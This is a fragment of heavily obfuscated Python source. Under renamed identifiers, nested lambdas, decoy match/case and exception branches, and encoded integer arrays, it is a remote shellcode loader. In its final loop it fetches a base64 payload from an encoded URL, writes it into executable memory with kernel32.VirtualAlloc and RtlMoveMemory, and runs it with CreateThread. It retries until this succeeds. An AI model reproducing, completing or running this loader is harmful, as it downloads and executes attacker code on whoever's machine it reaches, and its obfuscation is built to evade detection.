        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _137: _137 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _417 = [[(lambda : (lambda _104: _104 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _915: _915 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _168: _168 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _619:
        __7892525164111 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '155' == '178':
        case True:
            raise MemoryError([True])
        case False:
            _106 = [[True], [False]]
            R_E_D__A_V______(['_95'])
    raise MemoryError([True])
except MemoryError as _199:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _188: _188 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _110 = [[(lambda : (lambda _1315: _1315 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _87: _87 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _812: _812 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _510:
        try:
            raise MemoryError(__7892525164111)
        except MemoryError as __6206983502761:
            if __6206983502761.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __6206983502761.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5524812146068 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xf1\x18-\xcf\xdc\xd3'))()
            if __6206983502761.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4148049330965 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x1b?\x96X[\xe5'))()
try:
    match '1716' == '86':
        case True:
            raise MemoryError([True])
        case False:
            _811 = [[True], [False]]
            R_E_D__A_V______(['_25'])
    raise MemoryError([True])
except MemoryError as _711:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _29: _29 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _111 = [[(lambda : (lambda _1510: _1510 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _915: _915 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _191: _191 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1312:
        while (lambda : (lambda _132: _132 + (lambda : ______R_E_D__A_V_______((lambda : R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyx'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyu'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))()]))))())())()).read().decode((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda : R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue